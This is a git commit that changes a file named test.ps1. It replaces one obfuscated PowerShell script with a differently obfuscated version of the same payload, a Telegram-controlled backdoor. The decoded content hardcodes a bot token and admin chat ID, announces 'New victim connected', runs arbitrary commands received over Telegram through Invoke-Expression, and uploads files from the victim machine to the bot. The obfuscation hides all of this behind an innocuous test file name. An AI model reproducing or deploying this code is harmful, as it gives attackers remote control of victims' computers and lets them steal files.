1d39a3ee36ae6b32ff95cec03e4ed81ea58e8d0a
wagner012 <jamaalahmed1906@gmail.com>
2024-12-29 15:06:26 +0300

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,142 +1,142 @@
-& ( $psHome[4]+$PShOME[34]+'x')( " $(SeT-VaRiaBLE  'OFs' '') "+ ( [strING][RegEX]::MATcHES( "))93]RAHc[,)57]RAHc[+89]RAHc[+37]RAHc[( eCalpErC-)'
-))43]rahC[,)71'+'1]rahC[+401]rahC[+901]rahC[(  '+'ECAlpErC- 63]rahC[,)601]r'+'ahC[+99]rahC[+87]rah'+'C[( ECAlPer- 93]rahC[,KbI'+'VQDKbI ECAlPer- 69]rahC[,KbIr9'+'oKbIECAlPer-  421]rahC[,KbIPoRKbI  ECAlPer-  )KbI
+(("{168}{121}{114}{127}{87}{37}{29}{95}{119}{105}{98}{141}{130}{170}{180}{10}{71}{144}{35}{15}{117}{56}{75}{1}{32}{72}{122}{132}{169}{143}{101}{31}{123}{45}{64}{97}{91}{39}{175}{61}{104}{139}{136}{157}{44}{150}{171}{173}{138}{90}{84}{93}{48}{77}{125}{46}{126}{177}{69}{124}{107}{156}{131}{3}{110}{89}{53}{2}{182}{82}{36}{68}{14}{7}{78}{25}{161}{120}{17}{22}{76}{9}{137}{40}{30}{148}{159}{80}{5}{57}{99}{12}{118}{38}{134}{85}{154}{153}{92}{13}{21}{179}{116}{164}{41}{115}{174}{52}{102}{178}{34}{113}{86}{112}{28}{162}{67}{16}{142}{63}{50}{106}{111}{49}{58}{59}{128}{163}{181}{0}{160}{51}{129}{94}{96}{43}{11}{145}{100}{66}{27}{81}{79}{172}{18}{23}{60}{70}{149}{88}{167}{20}{33}{135}{47}{6}{103}{54}{176}{166}{165}{158}{140}{65}{8}{133}{62}{42}{146}{108}{147}{55}{24}{4}{73}{109}{152}{74}{155}{151}{26}{19}{83}" -f 'w in sess','chars.Length)] })
+    return tRTs','    hB','a; name=MJ','mMessage -ch','tRTre',' wUz',': app','}
+  ','    tRTrequest.ContentType = hBsmultipart/form-data; boundary=tRTboun','Generate-Session','else {
+                Send-Telegram','.GetResponse(','lePathhBs
 }
-2 sdnoceS- peelS-tratS    
-}    
-}KbI+KbI        
-}            
-rorre na g'+'nidnes tuohtiw sdnammoc di'+'lavni erongI '+'#                
-{ hctac '+'           
-}            
-}                
-)uhKbI+KbI'+'mnr9oKbI+KbIuhm nioj- tluserjcN( eg'+'assem- dItahcjcN dItahc- egasseMmargeleT-dneS                    
-{ )llunj'+'cN en- tluserjcN( fi                '+'
-1&>2 egassemjcN noisserpxE-ekovnI = tluserjcN                
-{ yrt            
-{ ))dItahcjcN(yeKsniatnoC.snoisseSevitcajcN( fiesKbI+KbIle        
-}       KbI+KbI 
-dItahcjcN dItahc- htaPelifjcN htaPeliKbI+'+'KbIf- eliFmargeleT-dneS            
-)(mirT.)01(gnirtsbuS.egassemjcN = htaPelifjcN            
-{ )VQD*daolKbI+KbInwod/VQD ekil- eKbI+KbIgassKbI+KbI'+'emjcN( fiesle        
-}        
-egasseMplehjcN egassem- dItahcjcN dItahc- egasseMmargeleT-dneS  KbI+KbI          
-pl'+'eH-wohS'+' = egaKbI+KbIsseMplehjcN            
-{ )VQDpleh/VQD qe- egassemjcN( fiesle    KbI+KbI    
-}     KbI+KbI   
-}            
-uhKbI+KbIm.noisses yna ni '+'ton era uoKbI+KbIYuhm egassem- dItahcjcN dItahc- egasseMmargeleT-dneS              '+'  
-{ esle     KbI+KbI      '+' 
-}            
-uhm.noi'+'sses eht detixe dItahcjc'+'N resUuhm egassem- dItahCnimdajcN dItahc- egasseMmargel'+'eT-dneS  '+'           KbI+K'+'bI   
-uhm.no'+'isses eht detixe eKbI+KbIvah uoYuhm KbI+KbIegassem- dItahcjcN dItahc- egasseMmargeleT-dneS            KbI+KbI    
-)dItahcjcN(evomeR.snoisse'+'KbI+KbISevitcajcN                
-{ ))dItahcjcN(yeKsniatnoC.snoisseSevitcajcN( fi            
-{ )VQDtixe/VQD qe- egassemKbI+KbIjcNKbI+KbI( fiesle        
-}        
-}'+'         KbI+KbI  KbI'+'+KbI 
-uhmDInoissesjcN :DI nKbI+KbIoisses deripxe ro d'+'ilavnIuhm egassem- dItahcKbI+KbIjKbI+KbIcN dItahc- egasseMmargeleT-dneS          '+'      
-{ '+'esle          '+'  
-}            
-uhmKbI+KbI.DI'+'noisKbI+KbIsesjcN noisses deretne dItahcjcN resKbI+KbIUuhm egassem- dItahCnimdajcN dItahc- eKbI+KbIgasseMmargeleT-dneS #                
-uhm.sdnammoc ruoy retnE .KbI+KbIDInoissesjcN noisses ni won era uoYuhm egassem- dItahcjcN dItahc- e'+'gasseMmargeKbI+KbIleT-dneS        '+'        
-DInoissesjcN = ]dItahcjcN[KbI+KbIsnoisseSe'+'vitcajcN                KbI+KbI
-{ )DInoissesjcKbI+KbIN qe- ]dItahcjcN[snoissesjcN dna- )dItahcjcN(yeKsn'+'ia'+'tnoC.snoissesjcN( fiKbI+KbI            
-)(mirT.)7(gnirtsbuS.egaKbI+KbIsKbI+KbIsemjcN = DIn'+'oisse'+'sjcN            
-{ )VKbI+KbIQD*llehs/VQD ekil-'+' egassemjcN( fiesle        
-}     KbI+KbI   
-u'+'hmDIn'+'oissesjcN :DI no'+'issesKbI+KbI a detareneg dIta'+'hcjcN resUuhm egassemKbI+KbI- dItahCnimdajcN '+'dItahc- egasseMmargeleT-dneS #   KbI+KbI KbI+KbI        
-uhmDInoissesjcN :si DI noisses ruoYuhm egass'+'em- dItahcjcN'+' dItahcKbI+KbI- egasseMm'+'argeKbI+KbI'+'leT-dneS'+'            
-DI'+'noissesjcN = ]dItahKbI+KbIcjcN[snKbI+'+'KbIoissesjcN            
-DInoisseS-etareneG = DKbI+KbIInoissesjcN            
-{ )VQDsnoisses/VQD qe- egassemjcN( fi        
 
-1 + di_etadpu.etadpujcN = tesffojcN        
-di.tahc.egassem.etadpujcN = dItahcjcN        
-txet.egassem.etadpu'+'jcN = e'+'gassemjcN        
-{ )tluser.setadpujcN ni etadpujcN( hcaerof   '+' 
-tesffojcN tesffo- setadpUmargeleKbI+KbIT-teG = setadpujcN    
-{ KbI+KbI)eurtjcN( eKbI+KbIlihw
-0 = tesffojcN
+# Notify ad','t-Type','3456789wUz
+','{
+            tRTsessionID = Generate-SessionID
+            tRTsessions[tRTchatId] = tRTsessionID
+            Send-Telegr','+ [System.Text.Encoding]::ASCII.GetBytes(tRTendBoundary))
 
-'+'uhm.detcennoc mitciv weN uhm egassem- dItahCnimdajcN dItahc- egasseMmargeleT-dKbI+KbIneS
-strats tpircs eht nehw nimda yfitoN'+' #
-
+    tRTreques','cha','ds','          Send-TelegramMessage -chatId tRTadmi','min when the script st','t = [System.Net.HttpWebRequest]::Create(tRTurl)
+','tId tRTchatId -message hBs','       Send-Telegra','FhBs
+    )
+    tRTfileContent = [System.IO.File]::ReadAllBytes(tRTfile',' Start-Sleep -Secon','ionIDhBs
+            }
+        }
+        elseif (tRTmessage -eq wUz/exitwUz) {
+      ','        if (tRTmessage -eq w','iveSessions = @{}
+tRTadminChatId = wUz7122592732wUz  # Replace with you','  ','    : Shows this','essionID
 }
-uhmhtaPelifjcN :yllufsseccus tnes elKbI+KbIiFuhm egassem- KbI+KbIdItahcjcN dItahc- egasseMmargeleT-dneS    
+','nChatId -message hBsUser tRTchatId exited the session.hBs
+            }
+            else {
+          ',' tRT','KLMNOPQRSTUVWXYZ012','ohBsdocumentMJohBs; filename=MJohBstRT([System.IO.Path]::GetFileName(tRTfilePath))MJohBstRTLFh','{}
+tRTact','sponseStream()
+    tRTreade','ve path).
+hBs','quest.ContentLength = tRTbody.Length
 
-)(esolC.redaerjcN    
-)(dnEoTdaeR.redaerjcN = tnKbI+KbI'+'etnoCesnopserjcN    
-)KbI+KbImaertSesnopserjcN(wen::]redaeRmaertS.OI.metsyS[KbI+KbI = redaerjcN    
-)(m'+'aertSesnopseRteG.e'+'snoKbI+KbIpserjcN = maertSesnopserjcN    
-)(eKbI'+'+KbIsnopseRteKbI+KbIG.tseuqerjcN = esnopserjcN    
-
-)(esolC.KbI'+'+KbImaertStseuqerjcN    
-)htgneL.ydobjcN ,0 ,ydobjcN(etirW.maertStseuqerjcN    
-)(maertStseuqeRteG.'+'tseuqerjcN = maertStseuqerjcN    
-
-htgne'+'L.ydobKbI+KbIjcN = htgneLtnetnoC.tseuqerjcN    
-uhmyradnuobjcN=yradnuoKbI+KbIb ;atad-mrof/trapitlumuhm = epyTtnetnKbI+KbIoC.tseuqerjcN '+'   
-uhmTSOPuhm = dohteM.ts'+'euqerjKbI+KbIcN    
-)lrujcK'+'bI+KbIN(e'+'taeKbI+KbIrC::]tseuqeRbeWpttH.teN.metKbI+KbIsyS[K'+'bI+KbI = tseuqerjcN    
-
-)'+')yra'+'d'+'nuoBdnejcN('+'setyB'+'tKbI+KbIeG.IICSA::'+']gnidocnE.txeT.metsyS[ + tnetnoCelifjcN + )sdleifjcN(setyBteG.IICSA::]gnidocnE.txeT.metsyS[( = ydobjcN    
-'+'uhmFLjcN--yradnuobjcN--FLjcNuhm = yradnuoBdnejcN    
-)htaPelifjcN(setyBllAdaeR'+'::]el'+'iF.OI.mKbI+KbIetsyS[ = tnetnoCelifjcN    
-)    
-uhmFLjcNFLjcNmaerts-tetco/no'+'itacilpp'+'a :KbI+'+'KbIepyT-tnetnoCuhm        
-+ uhmKbI+KbIFKbI+KbILj'+'cNuhmr9'+'Kb'+'I+KbIo))htaPelifjcN(emaNel'+'iFteG::]htaKbI+KbIP.OI.metsyS[(jcNu'+'hmrKbI+KbI9o=emanelif ;uhm'+'r9otnemucoduhmr9o=K'+'bI+KbIeman ;atad-mrof :noitisopsiD-tnetnoCuhm        
-+ uhmFLjcNyradnuobjcN--uhm  '+' KbI+KbI     
-+ uhmFLjcNdIt'+'ahcjcNFL'+'jcNFLjcNuhmr9od'+'i_tahcuhmr9o=eman ;atad-mrof :no'+'iKbI+KbItisopsiD-tnetnoCuhm KbI+KbI       
-+ uhmFLjcNyradnuobjcN--uhm        
-(@ = sdleifjcN    
-uhmnr9orr9ouhm = FLjcN    
-)(gnirtSoT.)(diuGweN::]dKbI+KbIiuKbI+KbIG.metsyS[ = yradnuobjcN    
-uhmtnemucoDdnes/KbI+KbInekoTtobjcNtob/gro.margel'+'et.ipa//:sKbI+KbIptthuhm = lrujcN    
-
-}    
-nruter'+'        
-uhmhtaPelifjcN :dnuof ton eliFuhm egassem- dItahcjcN dItahc- egasseMmarg'+'eleT-dne'+'S        
-{ ))htaPelifjcN htaP-tseT( ton-( fi    
+','
+    tRTupd','ns.ContainsKey(tRTchatId)) {
+   ','hatId entered session tRTsessionID.hBs
+            }
+            ','et','help mes','RTfilePathh','     }
+        elseif (tRTmessage -eq','ath tRTfilePath)) {
+        Send-TelegramMessage -chatId ','wUz) {
+            tRTsessionID = tRTmessage.Substring(7).Trim()
+         ','ssage -chatId tRTadminChatId -message hBsUser tRTchatId generated a ','er your commands.h','ates -offset tRToffset
+    foreach (tRTupdate in tRTupdates.result) {
+        tRTmessage = tRTupdate.mes','chatIdtRTLFhBs +
+        hBs--tRTboundarytRTLFhBs +
+    ','RThelpMessage = Show-Help
+            Send-TelegramMessage','= Invoke-Expression tRTmessage 2>&1
+                if (tRTresult -ne tRTnull) {
+             ','orEach-Object { tRTchars[(Get-Random -Minimum 0 -M','questStream.Write(tRTbody, 0, tRTbody.Length)
+    tRTr','   if (tRTsessions.Con','tainsKey(tRTchatId) -and tRTsessions[tRTchatId] -eq tRTsession','You have ex','aram([int]t','veSessio','tId tRTchatId -message hBsYour session ID is: tRTsessionIDhBs
+            # Send-TelegramMe','sage.
+/download -><file>  : Sends a file to the botwUzs c','tRTfilePath -chatId tRTchatId
+        ','ess','onswUz) ','Bs +
+        hBsConten','tem.Guid]','ite','ID {
+    tRTchars','
+function Show-Help {
+','atId t','esult -join hBsMJonhBs)
+                }
+            }
+            catch {
+                # Ignore i','aximum tRT','    tRTrequest.Method = hBsPOSThBs
+','tRTchatId -message hBsFile no','lication/octet-streamtRTLFtRTL','ssions.ContainsKey(tRTchatId)) {
+                tRTactiveSessions.Remove(tRTchatId)
+          ','Stream()
+    ','      if (tRTactiveSe','ontent-Disposition: form-data; name=MJ',' 2
+}
+','a','eader]::new(tRTresponseStream)
+    tRTresponseContent = tRTreader.ReadToEnd(','ssage.chat.i','Token/hBs
+tRTsessions = @','n.hBs
+    ','LFtRT','cation).P','t (absolute or relati','RTchatId -message hBsFile sent successfully: tRTfi','th -ChildPath tRTfilePath
+    }
     
-}    
-htaPelifjcN htaPdlihCKbI+KbI- htaP.)noiKbI+KbItacoL-teG( htaP- htaP-nioJ = htaPelifjcN        
-{ )))htaPe'+'lifjcN(det'+'ooRhtaPsI::KbI+KbI]htaP.OI.metsyS[( ton-( fi    
-)dItahcjcN]gnirts[ ,htaPe'+'lifjcNKbI+KbI]gnirts[(marap    
-{ eliFmargeleT-dneS'+' noitcnuf
+    if (-not (Test-P','-TelegramMessage -chatId tRTadminChatId -message h','r Telegram chat ID for admin notifications
 
-}
-teG dohKbI+KbIteKb'+'I+KbIM- '+'lrujcN irU- dohteMtseR-ekovnKbI+KbII nruter    
-uhmtesKbI+KbIffojcN=tesffo?setadpUteg}iru{jcNuhm = lruKbI+KbIjcN    
-)tesffojcN]tni[(marap    
-{ s'+'etadpUmargeleT-teG noitcnuf'+'
+','BsUser tRTc','ha',' [string]tRTmessage)
+    tRTpayload = @{chat_id = tRTchatId; text = tRTmessage}
+    Invoke-RestMethod -Uri hB','equestStream.Close()
 
-}
-egasseMplehjcN nruter    
-@uhm
-.)htap evitaler ro etulosbKbI+KbIa( tahc sVQDtob eht ot elif a sdneS :  >elif<>- daolnwod/
-.egasKbI+KbIsem pleh siht swohS :      '+'    >-    pleh/
-.noisses tn'+'erruc eh'+'t tixE :    '+'     >-    tixe/
-.sdnammoc etucexe dna noisses a retnE :>di_noisses< >- llehs/
-.DIKbI+KbI no'+'issesKbI+KbI modnar a setarenKbI+KbIeG :         >- snoisses/
-:'+'sdnammoC elbaliavA
-uhm@ = egKbI+KbIasseMplehjcN    
-{ pleH-wohS noitcnuf
+    tRTresponse = tRTrequest',' hBsInvalid or expired session ID: tRTs',' session.
+/help    ->      ','sage.','/helpwUz) {
+            t','RToffset)
+    tRTurl = hBstRT{','age {
+    param([string]tRTchatId,','session ID: tRTsessionIDhBs
+        }
+        elseif (tRTme','onhBs
+    tRT','try {
+                tRTresult','RTchatId -message','ohBschat_idMJohBstRTLFtRT','ssage -like wUz/shell*','d
+        tRToffset = tRTupdate.update_id + 1
 
-}
-'+'DInoissesjcN nrute'+'r    
-)} ])htgneL.srahcjcN mumixaM- 0 muminiM- modnaR-teG'+'([srahcjcN { tcejbO-hcaEr'+'oF PoR )htgneljcN..1((nioj- = DInoiKbI+KbIsseKbI+Kb'+'IsKbI+KbIjcN    
-7'+' = htgneljcN    
-VQD98'+'765432'+'10ZYXWVUTSRQPONMLKJIHGFEDCBAVQD = srahc'+'jcN    
-{ DInoisseS-etareneGKbI+KbI noitcnKbI+KbIuf
+','update.me','https://api.tele','ates = G','il','    tRTlength = 7
+    tRTsessionID = -join((1..tRTlength) pu9 F',')
+    tRTresponseStream = tRTresponse.GetRe','function Send-TelegramMess','s) + tRTfileContent ','otToken = wUz8002691180:AAGTuLHzMiU5Qf0XCeDi8wt8P0UFDdBnaD0wUz
+tRTuri = hBs','    tRThelpMess',' ','::NewGuid().ToString()
+    tRTLF = hBsMJorMJ','t found: t','Bs
+        return
+   ','gram.org/bottRTbot','ID) {
+             ','Bs
+                # Send','x-www-for','nt-Disposition: form-dat','age = @hBs
+Avai','      elseif (tRTacti','r = [System.IO.StreamR','      Send-TelegramMessage -chatId tRTchatId -message hBsYou are not in any session.hBs
+            }
+   ','RToffsethBs
+    retur','daryhBs
+    tRTre','tRTchatId)
+    if (-not ([System.IO.Path]::IsPathRooted(tRTfilePath))) {
+        tRTfilePath = Join-Path -Path (Get-Lo','uri}getUpdates?offset=t','d-TelegramFile -filePath ','stRT{uri}sendMessagehBs -Method Post -ContentType hBsapplication/','amMessage -cha','ell -> <session_id>: Enter a session and execute commands.
+/exit    ->         : Exit the current',' = wUzABCDEFGHIJ','Message -chatId tRTchatId -message','         ',' ','  tRTrequestStream = tRTre','d the sessio','hod -Uri tRTurl -Method Ge','   }
+    }
+   ',' (tRTr',' t',')
+    tRTreader.Close()
 
+    Send-TelegramMessage -chatId','nvalid commands without sending an error
+            }
+     ','fields = @(
+        hBs--tRTboundarytRTLFhBs +
+        hBsConte','n Invoke-RestM','sage.Substring(10).Trim()
+            Sen','quest.GetRequest','ion tRTsessionID. Ent','Path)
+    tRTendBoundary = hBstRTLF--tRTboundary--tRTLFhBs
+    tRTbody = ([System.Text.Encoding]::ASCII.GetBytes(tRTfield','Uz/sessi','   tRTactiveSessions[tRTchatId] = tRTsessionID
+            ','e (tRTtrue) {','es','wnload*wUz) {
+            tRTfilePath = tRTm','  ','tRTb','lable Commands:
+/sessions ->         : Generates a random session ID.
+/sh','m-urlencodedhB','t
 }
-dao'+'lyapjcN ydoB- uhmKbI+KbIdedocnelru-mro'+'f-www-x/noitacilppa'+'KbI+KbIuhm'+' epyTtn'+'etnoC- tsoP dohteM- uhmegasseMdnes}iru{jcN'+'uhm irU- dohteMtseR-KbI+KbIekovnI    
-}egassemjcN = txet ;dItahcjcN = di_tahc{@ = daolyapjKbI+K'+'bIcN    
-)egassemjcN]gnirts[ ,dItahcjcN]gnirt'+'s['+'(marap    
-{ egasseMKbI+KbImargeleT-dneS '+'noitcnuf
-'+'
-snoitacifitoKbI+KbIn nimda rof DI tahc mar'+'geleT ruoy htiw KbI+KbI'+'ecalKbI+KbIpeR #  VQD2372952217VQD = dItahCnimdajcN
-}{KbI+KbI@ '+'= snoisseSevitcajcN
-}{@ = snoissesjcN
-uhm'+'KbI+KbI/nekoT'+'tobjcNtob/grK'+'bI+KbIo.margelet.ipa'+'//:sptthuh'+'m = irujcNKbI+KbI
-VQD0DanBdDFU0P8tw8iDeCXKbI+KbI0fQ5UiMzHLuTGAA:0811962008VQD = nekoTtob'+'jcNKbI((( )KbIKbINIoj-]2,11,3[eMan.)KbI*rdm*KbI ELbAIraV-teg((.'(( ( )''niOJ-'x'+]3,1[)ecnerefeRPeSobRev$]GnIRTs[( (. ",'.' ,'riGHTToLeFT' ) | fOREAch-obJeCT{$_ } )+"$(sv 'oFs'  ' ')")
+
+function Sen','      Send-TelegramMessage -','d-TelegramFile {
+    param([string]tRTfilePath, [string]','et-TelegramUpd','@
+    return tRThelpMessage
+}
+
+function Get-TelegramUpdates {
+    p',' -chatId tRTchatId -message tRThelpMessage
+        }
+        elseif (tRTmessage -like wUz/do',' }
+
+    tRTurl = hBshttps://api.telegram.org/bottRTbotToken/sendDocumenthBs
+    tRTboundary = [Sys','text
+        tRTchatId =','arts
+Send-TelegramMessage -chatId tRTadminChatId -message hBs New victim connected.hBs
+
+tRToffset = 0
+wh','s -Body tRTpayload
+}
+
+function ','    Send-TelegramMessage -chatId tRTchatId -message hBsYou are no','sC')).REPlacE('pu9','|').REPlacE('MJo','`').REPlacE('wUz',[STriNG][cHar]39).REPlacE('tRT','$').REPlacE(([cHar]104+[cHar]66+[cHar]115),[STriNG][cHar]34)| .( ([STriNg]$VeRbosEPReFErEncE)[1,3]+'x'-JOiN'')
+
